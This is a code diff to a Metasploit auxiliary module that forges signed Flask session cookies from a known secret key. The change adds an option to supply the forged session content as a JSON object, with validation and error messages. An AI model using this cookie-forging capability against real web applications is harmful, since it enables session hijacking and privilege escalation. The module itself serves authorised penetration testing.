@@ -57,7 +57,8 @@ class MetasploitModule < Msf::Auxiliary
     register_advanced_options(
       [
         OptString.new('CookieName', [ true, 'The name of the session cookie', 'session' ]),
-        OptString.new('Salt', [ true, 'The salt to use for key derivation', Msf::Exploit::Remote::HTTP::FlaskUnsign::Session::DEFAULT_SALT ])
+        OptString.new('Salt', [ true, 'The salt to use for key derivation', Msf::Exploit::Remote::HTTP::FlaskUnsign::Session::DEFAULT_SALT ]),
+        OptEnum.new('CookieContentFormat', [true, 'Interpret NEWCOOKIECONTENT as literal text or a JSON session object', 'String', %w[String JSON]], conditions: %w[ACTION == Resign])
       ]
     )
   end
@@ -139,7 +140,16 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Attempting to sign with key: #{datastore['SECRET']}")
       secret = Rex::Text.dehex(datastore['SECRET'])
       salt = Rex::Text.dehex(datastore['Salt'])
-      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(datastore['NEWCOOKIECONTENT'], secret, salt: salt)
+      content = datastore['NEWCOOKIECONTENT']
+      if datastore['CookieContentFormat'] == 'JSON'
+        begin
+          content = JSON.parse(content)
+        rescue JSON::ParserError
+          fail_with(Failure::BadConfig, 'NEWCOOKIECONTENT must be valid JSON when CookieContentFormat is JSON')
+        end
+        fail_with(Failure::BadConfig, 'NEWCOOKIECONTENT must be a JSON object for a Flask session') unless content.is_a?(Hash)
+      end
+      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(content, secret, salt: salt)
       print_good("#{peer} - New signed cookie: #{datastore['CookieName']}=#{encoded_cookie}")
     end
   end
